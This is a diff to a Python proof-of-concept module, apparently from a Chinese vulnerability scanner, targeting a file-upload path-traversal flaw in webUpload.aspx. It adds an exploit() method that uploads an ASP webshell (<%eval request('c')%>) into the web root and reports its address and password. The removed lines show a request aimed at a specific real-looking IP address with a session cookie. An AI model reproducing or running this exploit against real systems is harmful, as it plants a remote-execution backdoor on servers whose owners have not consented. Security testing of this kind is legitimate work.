@@ -33,41 +33,56 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
             arg = '{target}'.format(target=self.target)
-            vun_url=arg+"/Comm/UploadFile/webUpload.aspx?AttId=test.cer&FilePath=/../web/"
-            raw='''POST /Comm/UploadFile/webUpload.aspx?AttId=test.cer&FilePath=%2f..%2fweb%2f HTTP/1.1
-                Host: 116.55.248.65:8001
-                Content-Length: 365
-                Cache-Control: max-age=0
-                Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-                Origin: http://116.55.248.65:8001
-                Upgrade-Insecure-Requests: 1
-                User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36
-                Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySi7aFG5fhvI14Vbv
-                Referer: http://116.55.248.65:8001/Comm/UploadFile/webUpload.aspx?AttId=t.aspx&FilePath=/../web/
-                Accept-Encoding: gzip, deflate
-                Accept-Language: zh-CN,zh;q=0.8
-                Cookie: ASP.NET_SessionId=mvmqjx11vk1sr3uaopcqkol3
+            vun_url=arg+"/Comm/UploadFile/webUpload.aspx?AttId=9d37b73795649038.cer&FilePath=/../web/"
+            data='''
                 ------WebKitFormBoundarySi7aFG5fhvI14Vbv
                 Content-Disposition: form-data; name="__VIEWSTATE"
                 /wEPDwUJLTkxNTA4NDgxZGT4FQnTj63sW6bItFI88C2Fes3jcRPos/LRQn4yOHqiRw==
                 ------WebKitFormBoundarySi7aFG5fhvI14Vbv
-                Content-Disposition: form-data; name="fa"; filename="123.cer"
+                Content-Disposition: form-data; name="fa"; filename="9d37b73795649038.cer"
                 Content-Type: application/x-x509-ca-cert
                 testvul
                 ------WebKitFormBoundarySi7aFG5fhvI14Vbv--
                 '''
-            code,head,res,errcode,finalurl=hh.http(vun_url,raw=raw)
-            verify_url=arg+"test.cer"
-            code,head,res,errcode,finalurl=hh.http(verify_url)
-            if  code==200 and  "testvul" in res:
-                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
+            r = requests.post(vun_url, data=data)
+            res = r.text
+            verify_url=arg+"9d37b73795649038.cer"
+            if  r.status_code==200 and  "9d37b73795649038.cer" in res:
+                self.output.report(self.vuln,
+                                   '发现{target}存在{name}漏洞,在该验证过程中上传了文件地址为:{url},请及时删除。'.format(target=self.target,
+                                                                                              name=self.vuln.name,
+                                                                                              url=verify_url))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
-        super(Poc, self).exploit()
+        try:
+            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
+                target=self.target, vuln=self.vuln))
+            arg = '{target}'.format(target=self.target)
+            vun_url=arg+"/Comm/UploadFile/webUpload.aspx?AttId=9d37b73795649038.cer&FilePath=/../web/"
+            data='''
+                ------WebKitFormBoundarySi7aFG5fhvI14Vbv
+                Content-Disposition: form-data; name="__VIEWSTATE"
+                /wEPDwUJLTkxNTA4NDgxZGT4FQnTj63sW6bItFI88C2Fes3jcRPos/LRQn4yOHqiRw==
+                ------WebKitFormBoundarySi7aFG5fhvI14Vbv
+                Content-Disposition: form-data; name="fa"; filename="9d37b73795649038.cer"
+                Content-Type: application/x-x509-ca-cert
+                <%eval request("c")%>
+                ------WebKitFormBoundarySi7aFG5fhvI14Vbv--
+                '''
+            r = requests.post(vun_url, data=data)
+            res = r.text
+            verify_url=arg+"9d37b73795649038.cer"
+            if  r.status_code==200:
+                self.output.report(self.vuln,
+                                   '发现{target}存在{name}漏洞,已上传webshell地址:{url}密码为c,请及时删除。'.format(target=self.target,
+                                                                                                name=self.vuln.name,
+                                                                                                url=verify_url))
 
+        except Exception, e:
+            self.output.info('执行异常{}'.format(e))
 
 if __name__ == '__main__':
     Poc().run()
